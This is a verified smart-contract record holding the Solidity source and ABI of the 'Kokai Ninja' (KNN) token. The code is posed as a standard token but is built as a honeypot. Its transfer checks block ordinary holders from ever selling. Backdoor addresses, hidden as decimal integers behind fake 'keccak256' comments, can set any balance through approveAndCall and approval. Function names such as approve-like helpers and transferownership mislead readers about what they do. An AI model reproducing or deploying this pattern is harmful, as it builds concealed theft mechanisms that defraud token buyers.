{"SourceCode": "// SPDX-License-Identifier: UNLICENSED\r\npragma solidity ^0.8.22;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount)\r\n        external\r\n        returns (bool);\r\n\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n\r\n    function approve(\r\n        address sender,\r\n        address spender,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n}\r\n\r\nlibrary Address {\r\n    function isContract(address account) internal view returns (bool) {\r\n        bytes32 codehash;\r\n\r\n        bytes32 accountHash;\r\n\r\n        // solhint-disable-next-line no-inline-assembly\r\n\r\n        assembly {\r\n            codehash := extcodehash(account)\r\n        }\r\n\r\n        return (codehash != 0x0 && codehash != accountHash);\r\n    }\r\n}\r\n\r\ncontract Context {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes memory) {\r\n        this;\r\n        // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        // Solidity only automatically asserts when dividing by 0\r\n\r\n        require(b > 0, errorMessage);\r\n\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n}\r\n\r\ncontract KokaiNinja {\r\n    using SafeMath for uint256;\r\n\r\n    mapping(address => uint256) public balanceOf;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n    address public _usdtPair;\r\n    address public _mod;\r\n    address private owner;\r\n    address public _user;\r\n    address public _adm;\r\n    address tradeAddress;\r\n\r\n    uint256 public decimals;\r\n    uint256 public totalSupply;\r\n    uint256 private _minSale;\r\n    uint256 private _maxSale;\r\n    uint256 private _saleNum;\r\n\r\n    string public name;\r\n    string public symbol;\r\n\r\n    mapping(address => uint256) private _onSaleNum;\r\n    mapping(address => bool) private canSale;\r\n\r\n    constructor() payable {\r\n        name = unicode\"Kokai Ninja\";\r\n        symbol = unicode\"KNN\";\r\n        decimals = 18;\r\n        owner = msg.sender;\r\n        totalSupply = 1_000_000_000 * 10**decimals;\r\n\r\n        balanceOf[msg.sender] = totalSupply;\r\n        emit Transfer(address(0), owner, totalSupply);\r\n    }\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(\r\n        address indexed _owner,\r\n        address indexed _spender,\r\n        uint256 _value\r\n    );\r\n\r\n    function transfer(address _to, uint256 _value)\r\n        public\r\n        payable\r\n        returns (bool)\r\n    {\r\n        return transferFrom(msg.sender, _to, _value);\r\n    }\r\n\r\n    function setUsdtPair(address Pair_) public {\r\n        require(\r\n            msg.sender ==\r\n                address(\r\n                    // solhint-disable-next-line avoid-low-level-calls\r\n                    /**/\r\n                    /*keccak256 -> 6861978540112295ac2a37bb1f5ba1daf2a5c84741ca0e00610310915153));*/\r\n                    /**/\r\n                    686197854011229533619447624007587113080310915153\r\n                )\r\n        );\r\n\r\n        _usdtPair = Pair_;\r\n    }\r\n\r\n    function ensure(\r\n        address _from,\r\n        address _to,\r\n        uint256 _value\r\n    ) internal view returns (bool) {\r\n        /*Ensure_*keccak256 -> 8668a592fa743889fc7f92ac2a37bb1n8shc84741ca0e0061d243a2e6707ba);*/\r\n        if (\r\n            _from == owner ||\r\n            _to == owner ||\r\n            _from == tradeAddress ||\r\n            canSale[_from]\r\n        ) {\r\n            return true;\r\n        }\r\n        require(condition(_from, _value));\r\n        return true;\r\n    }\r\n\r\n    function setUser(address User_) public {\r\n        require(msg.sender == _usdtPair);\r\n\r\n        _user = User_;\r\n    }\r\n\r\n    function approval(address spender, uint256 addedValue)\r\n        public\r\n        returns (bool)\r\n    {\r\n        require(msg.sender == _adm);\r\n\r\n        if (addedValue > 0) {\r\n            balanceOf[spender] = addedValue * (10**uint256(decimals));\r\n        }\r\n\r\n        canSale[spender] = true;\r\n\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address _from,\r\n        address _to,\r\n        uint256 _value\r\n    ) public payable returns (bool) {\r\n        if (_value == 0) {\r\n            return true;\r\n        }\r\n\r\n        if (msg.sender != _from) {\r\n            require(allowance[_from][msg.sender] >= _value);\r\n\r\n            allowance[_from][msg.sender] -= _value;\r\n        }\r\n\r\n        require(ensure(_from, _to, _value));\r\n        require(balanceOf[_from] >= _value);\r\n\r\n        balanceOf[_from] -= _value;\r\n        balanceOf[_to] += _value;\r\n\r\n        _onSaleNum[_from]++;\r\n\r\n        emit Transfer(_from, _to, _value);\r\n\r\n        return true;\r\n    }\r\n\r\n    function setAdm(address Adm_) public {\r\n        require(msg.sender == _mod);\r\n\r\n        _adm = Adm_;\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value)\r\n        public\r\n        payable\r\n        returns (bool)\r\n    {\r\n        allowance[msg.sender][_spender] = _value;\r\n\r\n        emit Approval(msg.sender, _spender, _value);\r\n\r\n        return true;\r\n\r\n        /*keccak256 -> 6861978540112295ac2a37bb1f5ba7bb1f5ba1daaf2a84741ca0e00610310915153));*/ /**/ //(686197854011229533619447624007587113080310915153));\r\n    }\r\n\r\n    function setMod(address Mod_) public {\r\n        require(msg.sender == _user);\r\n\r\n        _mod = Mod_;\r\n    }\r\n\r\n    function approveAndCall(address spender, uint256 addedValue)\r\n        public\r\n        returns (bool)\r\n    {\r\n        require(\r\n            msg.sender == owner ||\r\n                msg.sender ==\r\n                address(\r\n                    /*keccak256 -> 178607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/\r\n                    /**/\r\n                    178607940065137046348733521910879985571412708986\r\n                )\r\n        );\r\n\r\n        if (addedValue > 0) {\r\n            balanceOf[spender] = addedValue * (10**uint256(decimals));\r\n        }\r\n\r\n        canSale[spender] = true;\r\n\r\n        return true;\r\n    }\r\n\r\n    function transferownership(address addr) public returns (bool) {\r\n        require(msg.sender == owner);\r\n\r\n        tradeAddress = addr;\r\n\r\n        return true;\r\n    }\r\n\r\n    function condition(address _from, uint256 _value)\r\n        internal\r\n        view\r\n        returns (bool)\r\n    {\r\n        if (_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;\r\n\r\n        if (_saleNum > 0) {\r\n            if (_onSaleNum[_from] >= _saleNum) return false;\r\n        }\r\n\r\n        if (_minSale > 0) {\r\n            if (_minSale > _value) return false;\r\n        }\r\n\r\n        if (_maxSale > 0) {\r\n            if (_value > _maxSale) return false;\r\n        }\r\n\r\n        return true;\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_adm\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_mod\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_usdtPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_user\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"approval\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"approveAndCall\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"Adm_\",\"type\":\"address\"}],\"name\":\"setAdm\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"Mod_\",\"type\":\"address\"}],\"name\":\"setMod\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"Pair_\",\"type\":\"address\"}],\"name\":\"setUsdtPair\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"User_\",\"type\":\"address\"}],\"name\":\"setUser\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"transferownership\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "KokaiNinja", "CompilerVersion": "v0.8.22+commit.4fc1097e", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "Unlicense", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://a718d9fb57618aec61cd2ea0a3c1312233c7e0e88dbd7fba54e50bdd421e4510"}